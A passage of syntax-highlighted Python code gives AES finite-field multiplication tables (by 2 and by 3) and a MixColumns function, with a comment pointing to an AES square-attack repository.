<span style="color:#ae81ff">122</span>: <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">123</span>: <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">124</span>: <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">125</span>: <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">126</span>: <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">127</span>: <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">128</span>: <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">129</span>: <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">130</span>: <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">131</span>: <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">132</span>: <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">133</span>: <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">134</span>: <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">135</span>: <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">136</span>: <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">137</span>: <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">138</span>: <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">139</span>: <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">140</span>: <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">141</span>: <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">142</span>: <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">143</span>: <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">144</span>: <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">145</span>: <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">146</span>: <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">147</span>: <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">148</span>: <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">149</span>: <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">150</span>: <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">151</span>: <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">152</span>: <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">153</span>: <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">154</span>: <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">155</span>: <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">156</span>: <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">157</span>: <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">158</span>: <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">159</span>: <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">160</span>: <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">161</span>: <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">162</span>: <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">163</span>: <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">164</span>: <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">165</span>: <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">166</span>: <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">167</span>: <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">168</span>: <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">169</span>: <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">170</span>: <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">171</span>: <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">172</span>: <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">173</span>: <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">174</span>: <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">175</span>: <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">176</span>: <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">177</span>: <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">178</span>: <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">179</span>: <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">180</span>: <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">181</span>: <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">182</span>: <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">183</span>: <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">184</span>: <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">185</span>: <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">186</span>: <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">187</span>: <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">188</span>: <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">189</span>: <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">190</span>: <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">191</span>: <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">192</span>: <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">193</span>: <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">194</span>: <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">195</span>: <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">196</span>: <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">197</span>: <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">198</span>: <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">199</span>: <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">200</span>: <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">201</span>: <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">202</span>: <span style="color:#ae81ff">143</span>, <span style="color:#ae81ff">203</span>: <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">204</span>: <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">205</span>: <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">206</span>: <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">207</span>: <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">208</span>: <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">209</span>: <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">210</span>: <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">211</span>: <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">212</span>: <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">213</span>: <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">214</span>: <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">215</span>: <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">216</span>: <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">217</span>: <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">218</span>: <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">219</span>: <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">220</span>: <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">221</span>: <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">222</span>: <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">223</span>: <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">224</span>: <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">225</span>: <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">226</span>: <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">227</span>: <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">228</span>: <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">229</span>: <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">230</span>: <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">231</span>: <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">232</span>: <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">233</span>: <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">234</span>: <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">235</span>: <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">236</span>: <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">237</span>: <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">238</span>: <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">239</span>: <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">240</span>: <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">241</span>: <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">242</span>: <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">243</span>: <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">244</span>: <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">245</span>: <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">246</span>: <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">247</span>: <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">248</span>: <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">249</span>: <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">250</span>: <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">251</span>: <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">252</span>: <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">253</span>: <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">254</span>: <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">255</span>: <span style="color:#ae81ff">229</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MULTIPLICATION_BY_3 <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span>: <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">2</span>: <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>: <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>: <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">5</span>: <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">6</span>: <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">7</span>: <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">10</span>: <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">11</span>: <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">12</span>: <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">13</span>: <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">14</span>: <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">15</span>: <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">16</span>: <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">17</span>: <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">18</span>: <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">19</span>: <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">20</span>: <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">21</span>: <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">22</span>: <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">23</span>: <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">24</span>: <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">25</span>: <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">26</span>: <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">27</span>: <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">28</span>: <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">29</span>: <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">30</span>: <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">31</span>: <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">32</span>: <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">33</span>: <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">34</span>: <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">35</span>: <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">36</span>: <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">37</span>: <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">38</span>: <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">39</span>: <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">40</span>: <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">41</span>: <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">42</span>: <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">43</span>: <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">44</span>: <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">45</span>: <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">46</span>: <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">47</span>: <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">48</span>: <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">49</span>: <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">50</span>: <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">51</span>: <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">52</span>: <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">53</span>: <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">54</span>: <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">55</span>: <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">56</span>: <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">57</span>: <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">58</span>: <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">59</span>: <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">60</span>: <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">61</span>: <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">62</span>: <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">63</span>: <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">64</span>: <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">65</span>: <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">66</span>: <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">67</span>: <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">68</span>: <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">69</span>: <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">70</span>: <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">71</span>: <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">72</span>: <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">73</span>: <span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">74</span>: <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">75</span>: <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">76</span>: <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">77</span>: <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">78</span>: <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">79</span>: <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">80</span>: <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">81</span>: <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">82</span>: <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">83</span>: <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">84</span>: <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">85</span>: <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">86</span>: <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">87</span>: <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">88</span>: <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">89</span>: <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">90</span>: <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">91</span>: <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">92</span>: <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">93</span>: <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">94</span>: <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">95</span>: <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">96</span>: <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">97</span>: <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">98</span>: <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">99</span>: <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">100</span>: <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">101</span>: <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">102</span>: <span style="color:#ae81ff">170</span>, <span style="color:#ae81ff">103</span>: <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">104</span>: <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">105</span>: <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">106</span>: <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">107</span>: <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">108</span>: <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">109</span>: <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">110</span>: <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">111</span>: <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">112</span>: <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">113</span>: <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">114</span>: <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">115</span>: <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">116</span>: <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">117</span>: <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">118</span>: <span style="color:#ae81ff">154</span>, <span style="color:#ae81ff">119</span>: <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">120</span>: <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">121</span>: <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">122</span>: <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">123</span>: <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">124</span>: <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">125</span>: <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">126</span>: <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">127</span>: <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">128</span>: <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">129</span>: <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">130</span>: <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">131</span>: <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">132</span>: <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">133</span>: <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">134</span>: <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">135</span>: <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">136</span>: <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">137</span>: <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">138</span>: <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">139</span>: <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">140</span>: <span style="color:#ae81ff">143</span>, <span style="color:#ae81ff">141</span>: <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">142</span>: <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">143</span>: <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">144</span>: <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">145</span>: <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">146</span>: <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">147</span>: <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">148</span>: <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">149</span>: <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">150</span>: <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">151</span>: <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">152</span>: <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">153</span>: <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">154</span>: <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">155</span>: <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">156</span>: <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">157</span>: <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">158</span>: <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">159</span>: <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">160</span>: <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">161</span>: <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">162</span>: <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">163</span>: <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">164</span>: <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">165</span>: <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">166</span>: <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">167</span>: <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">168</span>: <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">169</span>: <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">170</span>: <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">171</span>: <span style="color:#ae81ff">230</span>, <span style="color:#ae81ff">172</span>: <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">173</span>: <span style="color:#ae81ff">236</span>, <span style="color:#ae81ff">174</span>: <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">175</span>: <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">176</span>: <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">177</span>: <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">178</span>: <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">179</span>: <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">180</span>: <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">181</span>: <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">182</span>: <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">183</span>: <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">184</span>: <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">185</span>: <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">186</span>: <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">187</span>: <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">188</span>: <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">189</span>: <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">190</span>: <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">191</span>: <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">192</span>: <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">193</span>: <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">194</span>: <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">195</span>: <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">196</span>: <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">197</span>: <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">198</span>: <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">199</span>: <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">200</span>: <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">201</span>: <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">202</span>: <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">203</span>: <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">204</span>: <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">205</span>: <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">206</span>: <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">207</span>: <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">208</span>: <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">209</span>: <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">210</span>: <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">211</span>: <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">212</span>: <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">213</span>: <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">214</span>: <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">215</span>: <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">216</span>: <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">217</span>: <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">218</span>: <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">219</span>: <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">220</span>: <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">221</span>: <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">222</span>: <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">223</span>: <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">224</span>: <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">225</span>: <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">226</span>: <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">227</span>: <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">228</span>: <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">229</span>: <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">230</span>: <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">231</span>: <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">232</span>: <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">233</span>: <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">234</span>: <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">235</span>: <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">236</span>: <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">237</span>: <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">238</span>: <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">239</span>: <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">240</span>: <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">241</span>: <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">242</span>: <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">243</span>: <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">244</span>: <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">245</span>: <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">246</span>: <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">247</span>: <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">248</span>: <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">249</span>: <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">250</span>: <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">251</span>: <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">252</span>: <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">253</span>: <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">254</span>: <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">255</span>: <span style="color:#ae81ff">26</span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e"># https://github.com/thomasperrot/aes-square-attack</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mixcolumns</span>(state: array):
</span></span><span style="display:flex;"><span>    new_state <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(state, dtype<span style="color:#f92672">=</span>int)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">4</span>):
</span></span><span style="display:flex;"><span>        a0, a1, a2, a3 <span style="color:#f92672">=</span> state[:, i]
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">0</span>, i] <span style="color:#f92672">=</span> MULTIPLICATION_BY_2[a0] <span style="color:#f92672">^</span> MULTIPLICATION_BY_3[a1] <span style="color:#f92672">^</span> a2 <span style="color:#f92672">^</span> a3
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">1</span>, i] <span style="color:#f92672">=</span> a0 <span style="color:#f92672">^</span> MULTIPLICATION_BY_2[a1] <span style="color:#f92672">^</span> MULTIPLICATION_BY_3[a2] <span style="color:#f92672">^</span> a3
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">2</span>, i] <span style="color:#f92672">=</span> a0 <span style="color:#f92672">^</span> a1 <span style="color:#f92672">^</span> MULTIPLICATION_BY_2[a2] <span style="color:#f92672">^</span> MULTIPLICATION_BY_3[a3]
</span></span><span style="display:flex;"><span>        new_state[<span style="color:#ae81ff">3</span>, i] <span style="color:#f92672">=</span> MULTIPLICATION_BY_3[a0] <span style="color:#f92672">^</span> a1 <span style="color:#f92672">^</span> a2 <span style="color:#f92672">^</span> MULTIPLICATION_BY_2[a3]
